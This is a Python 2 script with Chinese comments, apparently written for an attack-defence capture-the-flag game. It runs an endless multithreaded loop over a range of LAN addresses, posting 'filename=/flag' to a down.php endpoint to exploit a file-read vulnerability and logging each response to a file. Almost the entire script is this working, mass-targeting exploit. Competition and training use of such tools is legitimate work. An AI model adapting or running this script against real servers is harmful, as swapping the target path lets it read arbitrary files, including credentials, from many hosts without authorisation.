#!/usr/bin/env python
# encoding: utf-8
# 针对文件包含漏洞批量脚本
import requests
import urllib
import time
import threading

import base64

# 批量Get_Flag


def init1():
    global headers123
    headers1243 = {
        'Accept': '*/*',
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.1; ',
        'Cache-Control': 'no-cache',
        'Content-Type': 'application/x-www-form-urlencoded',  # 保证post数据
        'Cookie': 'PHPSESSID = di3qm91mb32ni47sbqmqg6rgt7;'
        # 'Referer': 'https://www.baidu.com',
    }


# 攻击的ip列表
def ip_list():
    global ip1
    ip1 = []
    for a in range(130, 150):
        #i = "172.20" + "." + str(a)+".101"
        i = "192.168.132."+str(a)
        ip1.append(i)


def get_flag(str1):
    s1 = str1.find('flag{')
    flag = str1[s1:s1 + 6 + 32]


def main():
    pass


def attack(ip):
    cookie = 'PHPSESSID=di3qm91mb32ni47sbqmqg6rgt7;'

    # ----------------攻击
    header1 = {
        'Accept': '*/*',
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.1; ',
        'Cache-Control': 'no-cache',
        'Content-Type': 'application/x-www-form-urlencoded',  # 保证post数据
        'Cookie': cookie
        # 'Referer': 'https://www.baidu.com',
    }

    url_payload = '/down.php'
    url = 'http://' + str(ip) + '/' + url_payload
    # 读取flag
    post_data = 'filename=/flag'

    try:
        content = requests.post(url, headers=header1,
                                data=post_data, timeout=3)
        flag = content.text
        flag = flag.replace("\r", "").replace("\n", "")
        print flag
        # 记录flag
        ip_log('flag1.txt', flag)

        # -1表示没找到
        # if flag.find('123') != -1:
        #    print "123123123123123213"
        # return content.text
    except Exception as e:
        # print str(ip) + ":Time out!"
        pass

    return 1


def flag_list():
    flag1 = {}


def ip_log(txt_name, content):
    try:
        f1 = open(txt_name, 'a')
        f1.write(content + "\r\n")
        f1.close()
    except Exception, e:
        print str(e)
        pass


if __name__ == '__main__':

    # 设置上限线程数
    threads = 1000

    # 主机地址
    # ip_host="192.168.132.1"

    # 初始化ip列表，列表名为ip1
    ip_list()

    # main()
    while 1:
        for ip in ip1:
            # print ip
            # 当线程过高，休息一会儿
            while (threading.activeCount() > threads):
                time.sleep(1)
           # print threading.activeCount()
            t1 = threading.Thread(target=attack, args=(ip,))
            t1.start()
            # t1.join(3)  # 3秒超时，但这个不能在最外层用，会拖慢线程

    print "结束"

# 其实get的也可以只用post的方式
